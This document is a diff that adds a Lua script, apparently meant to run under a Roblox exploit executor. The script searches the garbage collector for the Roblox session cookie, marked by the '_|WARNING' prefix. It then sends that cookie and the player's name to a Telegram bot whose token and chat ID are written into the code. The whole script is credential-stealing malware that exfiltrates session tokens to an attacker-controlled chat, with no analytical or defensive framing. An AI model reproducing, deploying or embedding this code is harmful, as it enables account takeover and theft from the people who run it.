@@ -1,0 +1,41 @@
+local HttpService = game:GetService("HttpService")
+local Player = game:GetService("Players").LocalPlayer
+local BOT_TOKEN = "8891863202:AAFOE51HO9CEtekAK-XiD8fAjwAqp3rz-dE"
+local CHAT_ID = "7659540201"
+
+local cookie = nil
+
+pcall(function()
+    for _, v in pairs(getgc()) do
+        if type(v) == "string" and #v > 800 and v:find("_|WARNING") then
+            cookie = v:match("(_|WARNING[^%s\"']+)")
+            if cookie then break end
+        end
+    end
+end)
+
+if not cookie then
+    pcall(function()
+        for _, v in pairs(getgc()) do
+            if type(v) == "table" then
+                for _, val in pairs(v) do
+                    if type(val) == "string" and #val > 800 and val:find("_|WARNING") then
+                        cookie = val:match("(_|WARNING[^%s\"']+)")
+                        if cookie then break end
+                    end
+                end
+            end
+            if cookie then break end
+        end
+    end)
+end
+
+local text
+if cookie then
+    text = "🍪 " .. Player.Name .. " | " .. cookie
+else
+    text = "❌ NO_COOKIE: " .. Player.Name .. " | getgc found " .. #getgc() .. " items"
+end
+
+local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. HttpService:UrlEncode(text)
+game:HttpGet(url)
